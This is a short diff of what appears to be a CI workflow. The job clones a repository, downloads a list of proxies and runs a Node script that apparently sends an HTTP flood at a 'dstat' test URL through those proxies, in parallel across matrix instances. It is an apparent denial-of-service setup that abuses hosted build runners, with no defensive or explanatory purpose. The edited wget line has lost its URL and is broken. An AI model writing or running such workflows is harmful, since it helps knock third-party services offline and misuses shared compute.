@@ -40,7 +40,7 @@ jobs:
           
           git clone  https://github.com/Ggeg111/curly-octo-doodle.git
           cd curly-octo-doodle
-          wget https://raw.githubusercontent.com/iamthebestm85/Proxy-Scraper-And-Checker/main/proxy.txt -O proxies.txt
+          wget  -O proxies.txt
           node m.js GET https://c3.dstatbot.win/rB5fB5bL 700 4 120 proxies.txt
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
